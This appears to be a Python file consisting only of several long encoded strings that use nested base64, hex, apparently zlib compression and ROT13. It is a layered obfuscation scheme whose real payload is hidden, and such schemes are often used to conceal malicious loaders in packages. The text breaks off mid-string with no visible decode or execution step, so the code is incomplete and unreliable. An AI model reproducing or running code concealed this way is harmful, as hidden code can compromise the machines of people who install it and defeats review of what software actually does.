import base64, codecs

morpheus = 'aW1wb3J0IGJhc2U2NCwgemxpYiwgY29kZWNzLCBiaW5hc2NpaSwgc2l4Cgptb3JwaGV1cyA9ICc2NTRhNzk3NDY2NGU3NTUzMzQ2YzY5NzkzNTU4NzQzOTUyNjIzOTU2NDgzNTc0NmE3ODMzNTM0MjUwNDI2YzZkMzAzMjRkNmQ1NTZiNDk1ODc0NDM0NjMwNDE1NTRiNzk2NjY5NDc1NTQyNDk0NjQxNDk0ZTQ1NTE3NTZlN2EzOTcyNGY1NTY5NzEzNzcxNTA3NDYzMzM1NDUwNDc1MzUyNmY0YjMyMzkyZjY1MzYyYjY2NTg2ZTU3NzM2MTcxNzY3NDJmNzQ2NjMzNmU2NjJmMzI0ODJiNjIyZjRmNjQ2NjY5NzU3NjUwNjY2NjQ3NTAzMzMzMzY3MjcyNzI2NjM2NjMyZjJmMzQ3ODMxMmYyYjM5NzA2NjY2NjQzMTc1Mzk2NjU0NjM0NDdhNTg2NTQ0N2EzODRhNTk0NzM4NzM2NjM3NTc0NjY2NjQ1ODU2MzI2MjQxMmI1YTM4NTg0YzRiNzQzODczNjgyZjQ0NDUzNzM3NzI1YTU0NTA0NjJmNTc3NTM2NTEzOTQ2NGQ1YTM1Mzg3NTRlNTEzMzJmNDY2NTc1MzM0ZDMzNjU3NDQ2NjI0YzJmMzQ1MDUwNDUzMzZhN2EyYjU2Nzc0ZDcwNjYzMjMyNmM3ODU3NzY3MDQ1NGU2ODYxNDc0NzYxNDY0MjMyNGU2YzMyNTc2YTcyNmI3MzRkMzMzMTVhMzQ2YzZjNWE2NDQ1NzMzNzc3N2E3MjU2NGMzOTRmNTQ3NTYyNGM3YTYxNmQ2YzQ4NDc3NDYxMzM1MzJmNzMzMDRjNDk2MzQ5NzYzMjUwNjQ3MzRkNjIzMzc0NjI2MTMwMzQzNjRkNjE2YzRhNDc1ODJiNGMzMDM4MzY0NzcwNTk1OTM1MmI1NDcyNzQ0YjM4Nzg0ZjY1NDE2NjYxNjQ0YzU2MmI2YzU5NjQzODU5MzczNTY5NzA2NDQ0Mzk2ODY2NTczNjYyMzQ1MDU0MzM2ZjU3NWE3MDMxNjU0YjY2NTA1MzJiNzczMzU3NDE1MDZmNGM0NjU4NmM2MzJmMzE3MDRmNjY2OTYxNGI3NjRlNGI3OTY1MmYzNTM1N2E0YTMxNzQ0YTU1NjQ2NzUyNjQyZjc3NTAzNzQ4MzU1ODQ0NDEzODM4N2E0MTQ3NjE1MzM3NGEzMzJmNTk2MTM2NzE0NzQ1MzUzNTZlNDEyYjY3Njk0ODM3NzE3MTczNDM1YTU2MzAzNjU4NjgzNDQyNzczMTc3NjI2ZDY3NDgzMDM4Njg0MjdhNTc0MTZjNjk0NTQ0NmUyYjQxNjY3Njc5NzUzNzQxNTAzMjVhNmI2NjQ1MzgzNzQxNGQzNjc1NTc1YTU5MzI1OTU1NDc0ZjY1NDU1NDY0NDY1OTRiMmI3NzUxNTYzMzc0NjU3NzU4N2E2NTY1NzIzNzY5NmE0MTY0MzUzNjRlNTI3YTc3Mzk3NzRiNzk3MzQzNDE0ODcwNTMzMTY0Mzg0Njc5NzU3MDM2NGUzODczMzg2Yzc5MzYyYjQzNGQ0NDY2NjY0ODUwNzQ0NDRlNzM0MjM2NDU0YzM4NTA0MjY1N2EzODJmNzM1MTM1Nzk3ODZlNzIzNzZmNDk0ZDc1Nzk0YzczNzc1NjU1NmMzNTM4NDg2YzQyNTA2YjQxN2E3YTcxNmY2NzU0Nzg3NDMwMzg0ZjUxNTM3NjMxNjQ1MjZlMzU1NzUxNDgyYjUxNGQ3NjY5NDU0ODc5MzE2YTVhNzE2YzMyMzY1MDczMzc0ODc2NzE2YjQzNTAzNjQ0NjY3NzUwNmIzMjdhNmU1NTdhNGM1MTY0MmYzMTQzNmU2YjZhMmY1NTRmMzk0MjQ2NDI3MDM0NTczMjUzNzY0ZDU0N2E3MzRjNzY2YjYzMzc2NjU2Nzk0ZTY2NGE2ZDY5NWEzODQ2NGU1MjU4NmQzNjQ3MmY2NjUwNzk0YjU5NjQ2NTVhNDQ3MTQxNTgzOTcyNTY0MTRjNzU3MDQ4NGE0ZTM3Njc0NjJmNTE2YzM0NDU2ZTMyNDk0ODQ5NDUzNzVhNjM2Nzc0MmI0MjY2NDI1MzZhMzM2ZDZjNzY2YzU5MmYzOTM4N2E1MDRmNjc0YzMxNDY1NTM1NDYyZjQzNjI3NDRlNDkzMjUwNjM0ODMzNmY1YTZmNGE2MzUzMzUzNjY2NzI0MzY2NTc1NTMyMzE2YzQ4NGYzODQ3MmIzMTQyNzY3NDQ2NGM3MTRlMmI0ZTc3NTE0ODZkNmM3MjY0NmY0NzdhNmY2NDY0NTU2YTU4NTk0ZjY1Mzg3NDRiMzA3NTZkNDQ0NDJiNjk2ODQxNmUzODcwMzkzNDQ4NGUzMjQyNDYzMTVhNjQ0OTc1NzE0NTJmNzc0YzYyNTM0MzQ0MzY3NzJmNmE0ZTM4NGU0MjMzNTk0ZDUwMzA2ZTU4NzU3MTRjNjQ3NTU5NmYzODU0NTU1ODUwNTEzNDU0MzM0ODRkNzI2YzRjNDg1MzU3MzE0MjUwMzE1NDU0MzU0ZjQyNzU3NzUzN2E3NzJiNTE0NjJiMzE0NDUxNjMzNDUyMmY0NjQ4Mzg3MTRiNDk2NDc3NGI2NTRkMzA2NjM0NzA0ODM2MzQ0ODMzNWE1ODY5NTA2OTMzNzM1NDc4Mzk3NDZhNTgzNTQ5MmI2ZDQ4NmUzNDQ1MzI0YTUwMzE0ZDJmNmM3NDQzNDIzNzc5NjIzODQzNzY0OTQ1MzM1MzU4NmY2ODczMzg0YTY2Nzg1Njc0NmU1NDYyNDEyZjU1NDU2NjdhNmY1ODJiNDk1NTYzNDgzOTQ2NDE3NTQ5MmIyYjY5NDkzNTM1NmEzMDc5MmY3MDRmNzk0OTJmMmI3MjY1NTc2YzVhNDE3NjVhNDE3NDM1Nzc0ZjM0NTY2NTRkNmM2ZjUyMmY0MTU4Mzg2ZjQyNTAzMjY5NDgzODUwMzA3MzZjNmE3NjQxMzUzOTRjNjE0NzZlNmY0YzZhMzA2ZTYyNzc0ODc1NTQ3NDc3NmEzNTUzMzg1MzUwMzQ0ZDMzMzY0ODMzMzYzMjZmNDkzODYxNjI3NDQ3NDIzODc3NjY3MzRiNjQ3MzYyNjY0OTQ2NjY3NzQyNTI3MzU5NGI0ODY2NTk3MDMwMzczNTc3NGIzOTZmNjIzNjUwNjM0MjM5NGE0YjJiNzE0Mjc2MmI0MzU4NmE0NjMzMzA2NjYzNzM2MTM1NDU1NzRkNDMyYjRkNjQ2NTM0NDgyYjRkNGU3OTY0NzQ2YzQzMmY2ZjZmNDYzNjY3NmYzNDc4Nzk3MTRlNTk1MzY2MzU2MTc1NjcyZjRlNDk0YzJiMzI1YTYzNjU1NjY3Njk0ODM0NmI1ODczNDM1MDYyNGM0NzMxNmE2ZTQ1Nzg3NDM4NTc3NTY0NGU2ODRlNGMyZjcxNjg1MDVhNTY3MjM2NDk0Zjc5NzA0NDM5NDc0ODY1NTc2MzQ0NjU3NTRmNjY3Mjc0NGI0ZTM1MmY1MTZiNzk2MjM2NTM0YjZiMmYzMjQyNDI2YjQyNDg3MzU5NDc0NDc2NTY0NTQyMmY3ODUwNmU1NTY4Mzk3MjMyNjk1MDM5Njk3NzRmMzk0OTQ2MzIzNDRjNjQ1MTc2MzY2OTVhMzA1MDM0NmY0YTMzNmE3NjQyNTgzOTZmNDc0YTM4Nzc2NjczNzA2NTYzNjQzNjU3NTk3NjdhNzg2NjM5Njc2ODJmNDE1NDMwNGU3NjUzMzczMTUxNGE1MDM4NjMzNTU5N2E3OTMxMzg0ODMxNGU2NTM0NjQzODcxNTgyYjY2NjM1MTRmMzg1OTQyMmY0OTQxNDg1MTRkNTk3MTY1MzI3ODQzMmY0YjU0MzI1MTQ4NTA1NDRjNzUzNDMxN2E3OTY5NzY2YTc1NmE3NjQ3NDg2NDY3NjQzNTYxMzY0YjdhNjc2NjM0NzU0ZDYyNTg2ZTUwNzA0NDU0NTY1MDc5NTEyYjY5MzQ1YTMxMmY0NDRkNmE1NDU0NDc1ODdhNTY1MTcyMzY0MzY2NjY3MDY0NDMzMzcxMzc1MTU0NjIzMzQyNTA2ZTQyNGY2MTY3MzA2OTVhMzg2MTU2NmM0ODM0Njc2MzVhNjIyYjUzNGM3NTQ0NmU2ZTdhNDc2NTU5MzM2ZTY3NGU1OTcwMzQ3NzQ4NTA1YTM5Mzc0OTZmNDUyZjYxNTEzNTVhNmQzNDJmNzE1NTM4NTkzOTc4MzY3OTY2Mzk0ODMzNGI2ODcyNDUzNzY3NTcyYjRjNmU0OTUwNTk2ODM3MmI2NTY2NmM0NDRlMzA0ZTQ2NmI3OTU2Nzk0NDY1MzA1MjM3NzA0YzdhNjk2MjY1NTE0ZTM2NDk2ZTJiNGI2ZTM5NDE3YTM0Nzk2ZTcwNDI1MjMzNzA1MTUyNGQyZjU5Nzc3OTUzMmY0MTYxMzU0ZDMyMzg3OTc2NzQ0NjY2NDI2ZTJmMzA0MTM1NzYzNzUxMmYzNDU2MzkyYjUyN2E2OTMzNTI0YjZhNmY0YTY2NTQ0YTZjNTgzNjU3NzY3NzQ2MmI2NzQyNjU2Mzc4MzIzOTQ2NDc0ZjZiNDczMjRiNGY0NDc2MzY0MjM3MzQ3YTcwMzA3NjY1NDY3NjM5NmQ2ZTQ5NDUzODU0Mzk2ODU4NmYyZjM2NjY2NTU1NDgzNDUyNDg3Nzc1Nzg2MjM5NGIzNTZkNmU2ZDRlNzU3YTRjNDc0NjY0NTM1ODc5NjYzNDQ0NjY1MTRhMmYzMTU0NGQ2MzM5NTQ0YzU1NDM0Mjc2NTM2Yjc5NTk1MzcwMzQ3NDU3NTI2NjM0NTI2OTM1MmI2YTc1NjY2OTc4MzA0OTQ4MzQzOTZiNTk1NDMwNzY2ZDQ0NjU2Nzc4Njg2NjM5Nzc1MDY2NTg1MDJmNDE0YzM1MzQ0NjUwNjk2Zjc1NTE3NDMxNzg2ZTdhNDU0NzQ5NmEyYjRkNTgzNTcyNDM1MDM0NTA3NTRlNGI3NzU2Nzk2YzZiNzczNjUyNjIzMDcwMzkzMDU4NTk2ODU1Mzk2NzMxMzc0YzQzNmE2Yzc5MzQ1YTU2MzA3MjU3NDMzMDU1NzY2NjRlNGQ0Zjc4NWEzNjU5NzIyYjZhNzY2NTQ2MmY2OTUwMmY0ZDZiMzQ3NzQ0NmI1YTQ0NzY0ZDZlMzc0MTRjMzI0Yjc2Mzk2YjJmNmU1OTQ3NGY3MzYzMzE2YjRmNzk0ODc2NzE0ZDQ3NjM2MzMxNzM1MTZlNGE3NDM4NmY1OTMxN2E0NTc2NDgzNjU0NjU1OTQ4MzU2MTUzNzYzNDM4NmE0ZjY1NTU2OTQyMzk2MzVhNzgzODQ3NzM1NTY1NzA2Mjc4Njk0ODZkNDI2NjQ2NTQzNjQ2NDgzMTZiMzI0ZDQ5MzI0YjU4NmM1MDRlNTIyZjRlNTY2ZDcyNmY0ODY2NTM2MjMwNTQzMDU0Mzk3ODZhNzY1NzMwNjQzOTJiNTE2NTZiNTAzMDUzMmY2Zjc5Nzg3MzY1NjUyYjU4NzkzMDQ4MmI2ZjQ0NjM1NTUwNzM0NzJmNDg0NzUwNzQ0MTY2NTU1NDY1NjM0NzQ4MmYzMDRkNTQzNTY5NjIzOTZmNDQzNDc4NzI2OTM3NTI0YzM4NGQ1MjM3NDI1MDM3NDE2NjM0NmY3Njc3NmI2NzMwNTMyZjc5NzMzMTc4NzEzMzMwNGQ0OTY5MmY1NjMyNzE3Mzc3MzA0NDMzNDc0MzM4NjQyYjcyNmE0YTJmNDEyYjM2NGEzMTRiNTgzNDQyNTAzMjQxNzY2ZDczNGEzODc5Njg3MTUwNjQ1OTRjN2E0MjY2Mzk1NjQ5NTg1MzcwMzU2ZTcyNzE0NzY0MzA1YTJmNjg0ZTM1NTg1MDRmNGU0NTc4NjY3OTRjNGY2YjRlMmI3ODQ4NmI2NzVhNmIzMjY4MmYzMDY1Njg0ODY5NTA3NTMwNjYzOTRjNTAzMjQzNzU3ODZhMzUyYjMwNDIyYjY4NTQzNDcxNmY3NDY0NTI0ODY5NDE1NzRmNzA0ZTY0NjE0ODQ1NzI2NTVhNmEzMTZiNDgzODdhNzYzOTQzNGUyZjY0NmE1MDQ2NGU2ZjMzMzU1YTUyMzk0NTRmNTI1MzY1NGQ3OTYxNmU1MTQyNjYzOTY4NTA2YTZiNWE1OTc5MzM0YTJiNjc1NDY2NDU1NTYzN2E3ODZiMmI2MjJiNjgyZjdhNjQzNDYxMzg0MTRjNzEzNDM3MzU0NzJmNjkyZjJmNGI2MzM4Njc1MDJmNDU1MDY2NzE0ODM4NTAyYjZhNGY2ZTZkNGQ3NDZlMzM0ZDYzMmI0Zjc2MzI1NzM5NTI3MDc0NDI2NjU2NmM1MjM3Mzg2MzM0Mzc0ZjUwMzUyZjQxNjI3OTQ1NTA3MTUxNGQ1MjY2Nzg1NDY3N2E2OTQyNzg3MDcwMzY3ODMzNDk0MzYzNDg2NDZmNDUzOTU4NjQ1YTc4NTU2ZjM4NzkzMzZiNDE2ZDZhNzQ2NzU4MzU1MzUyNzk0NzMxNjg3NjM1MzA0YjQ4MzE0OTU1NzAzOTYzNjI2ZTQyNjU0ZDcxMzQ3NzJmNzA0NjY2MzA3MDM1NmE2NjU3Nzk2Mzc3NjY3MTQ3MmI1Nzc0NGI2Mzc0MmY1OTU3MzEzMDU2NGQ0ZjdhNDU3NDMyNjY2ZTcyNGI1MTVhNGUzNjZmNmQ1MzM4Mzg1YTZlMmY2MTYzNzU2ZDMxNGM0YzU5NjY3OTU2MmI2YTdhNzE0MTY1NjQ1ODQ2MzczMjRmMzk3NzZhNzk2ZjMwMzIzNDc5Nzg3MTRhNGIzNjQyMzk2YTRlNmQ2ZjUwNzE2MTY0NzA1YTM3NjI1NTM3NTY1MDc4NzE1MjRjMmI0YjU4NTU2NjM1NDE1YTJmNTY0OTdhNDg2YTQ0NzUzODc4MzQ2OTYzNDM2YjMxNzk0OTMyNzQ2ZDMxNDU'
trinity =  '0AGplAmx1BQLmAzH2MGD1ATDlMwEzZmDmZGp4AQV0BQH1ZmHmBGpjAzL2MwL5AJR3Awp5AQt1BQH0Zmx2BGpkAmH3ZmZ5Amt2BGH4AmR1ZwL2AzDmZmLkATV1AQL1AzZ2MGpmAGH1ZQHmAQH3AGMzAGtmZmDkAwZ1ZmLlATH0ZwExZzL3ZQL4ZmH1Amp2AQD0MQIuA2R0AGp2AzV2MQH4AzD0AQZ4AGx2AQZ2Awp0AwWvAzV2LGD5AGN0AwMvZmDlLwD5Zmt1BGMvZmR3AwZ4AQtmAmMwATH0ZmD0ZzV0ZGMxZzLmZGD1AwZmAmIuAQt3BQL4AGt3AGEzZmx2LGHjAGpmZmZ2AQR3AwZ1AQZ2AwIuAQL1ZQZ2ATZlMwZjAGRmAGpjAQL3AmHjAzR0AQEzAzL0LGZ4AGDlMwD3AwZmAGD2AQD3LGZ3Amp3ZmZ5AGZlMwMzAQp1Amp0AwLmBQHmAwL1Amp5ATZ0ZmMyATH2AwZlATZ2AQMwAGt1ZmH4Awt1BQp2AwZlLwZ2AwRmBGL3AGV1LGp5AQtmZGD1AJRmAGp4AJRmZQp2ZmH2AQZ1AQZ1ZQHmAmt2Zwp4AQRlMwZ4AGNlLwMxAwZ1ZGHkZmR3ZwH2Amx2MGquAQR2LwH4AmR1Zwp5A2RmAGD1Zmp2LwEyA2R0AQD3AQR2AwMzAwD3LGLlAzR0AQp1AGH2ZGp3AGVmBQEvZmL2MwL1AwL2Lwp1AwZ3BGpkAGp2ZmEzAwZ2AmWvAQLmZmWvAQLmBQp4AQZ2MGH3AQp1BGquAQD0Lmp1ZzV1BQZ5AQt2AwD5AwL2AQHkAwVmAmZjAwZ1AQp1AGHlLwEuAwL2BQH0Amx1ZwH2Amx0MGZ4AwV2ZGL3AwLmAmEzZzV3ZwL4AzR1ZQL4AQLmAmH5AQV2AGp0AQtmBQExAQHmAwL1AmL3ZGExAzH3BQEzZmH1ZwWzAQDlLwDmAGVmAQp5Amx1Amp1AmZ1AmH1AzVmZmZ5AwZ3AQH5A2R0LmMuAQR0MwD2Amt1ZGp2AzV2AQIuAGV3BQp2AwZmBQp0ZmD0BQp2ZmD0BGZ4Amt2LGpkAGL2AGH5AmLlLwMxAmLmZmWvZmVlMwZkZmV3AwDlA2R3AwHjAwHmAmplAwLlMwMwAwD2MGZ3AzH2BQp4AQV3ZwL5ATV3AGL0AzH1AwEuZzL0AQZkAzR3AwMyAzZ1AwL0AJR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'
oracle = 'M0YzUzNjg0MjUyNmU1MTZjMzk1OTZkNTM2MTZiNzY1ODRhMzY3MjUyNDU3NDMxNWE3MzYxNzY0MjZhNjg2ZDM3MmI0YjM0Njc0YjVhNGY2YzRjNTYzMDM5NjQ3MjQ3NDg0NjYyNzYyZjcxNTc0OTU4NDg1NjRhNjkzOTM1NTM2NDMwNTY0ZDc2NGI0MTM5NTI0ZDcxNGM0ZjRjNzA0NTcxNjQ2ZDU2NGY0OTJmNmY3MjM5NGY1NjQ4NTE1NjQ2NzQzNjYxMzQ1OTMwNzM1NTcyNDg1ODYxNjIzOTU3NTg0YjRjNmMzMDMwMzg2YjU4NTU2NzcwMzA3OTUxNjUzMzU5NDI1NjcxN2E3MTM2NTY0YzY0MzY2ZDRiMzk0OTc3NmY0YjczMzU1ODQ5Njc2MzQ4NmUzNTc2NTAzNTVhNWE2NDRhNTg2MjUyNzM2ODQ4MzE3MTRhMzY2ZjczNTA0MjQ5MzE1MDMxNGE1ODM2NzI1OTRlNTI3YTZjNmM0OTM1NmY3MjUzNDkzOTQxN2E3NjQ5Mzc0NDcxNzg1NzM4NTU3NTY1NTE1MTM1NDU2MTU3NTM0YzZmNmY2ZDM2NDM1MDUyNGM1MzRjN2E1MDRjNzY3OTMyNjY1NTU4NGU0ODQ3NTY0YjZiNDc1ODQ2NGM3NTQ3NGM3Mjc1NzEzMDcxNTc2OTJmNDg3MjcwMzY2NzM3NzM0MTcxMzI2NjQzNDQ0ZjM3NzE2NTc1Nzg0ZjM4MzQ0ZjZjNjE0MzczNmY3MDM4NTI1NjUzNjUzNjUyNmE1NDRjNWE1NjY0NGY3NTcwNDg2NzRmMzI0YjMzMzA1MzQ0NGI3MzQzNzc2YTU1MzE0MjZhNTczMTQyNzAzNzRmNjM1NDY0NWEzNDczNDIzMDQ3NDQ3MDY